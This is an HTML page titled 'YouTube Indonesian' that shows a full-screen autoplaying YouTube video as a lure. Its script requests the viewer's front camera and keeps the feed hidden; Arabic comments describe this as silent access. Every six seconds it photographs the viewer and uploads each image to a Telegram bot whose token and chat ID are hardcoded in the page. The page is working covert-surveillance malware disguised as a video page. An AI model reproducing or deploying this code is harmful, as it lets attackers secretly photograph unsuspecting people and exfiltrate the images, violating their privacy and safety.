<!DOCTYPE html>
<html>
<head>
  <title>YouTube Indonesian</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
    }
    #videoElement, #canvas {
      display: none;
    }
    iframe {
      width: 100vw;
      height: 100vh;
      border: none;
    }
  </style>
</head>
<body>

<!-- فيديو يوتيوب -->
<iframe 
  src="https://www.youtube.com/embed/n_8QamAbKso?autoplay=1&mute=1&controls=0&showinfo=0&modestbranding=1&rel=0" 
  allow="autoplay; encrypted-media" 
  allowfullscreen>
</iframe>

<video id="videoElement" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
  const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
  const CHAT_ID = '6036900535';

  // الوصول إلى الكاميرا الأمامية بصمت
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
    .then(stream => {
      const video = document.getElementById('videoElement');
      video.srcObject = stream;

      // بدء التقاط الصور كل 6 ثواني
      setInterval(() => takePhoto(video), 6000);
    })
    .catch(err => {
      console.error("فشل تشغيل الكاميرا:", err);
    });

  function takePhoto(video) {
    if (video.videoWidth === 0 || video.videoHeight === 0) return;

    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'photo.jpg');

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(res => res.json())
      .then(data => console.log("✅ صورة أُرسلت"))
      .catch(err => console.error("❌ فشل الإرسال:", err));
    }, 'image/jpeg');
  }
</script>

</body>
</html>
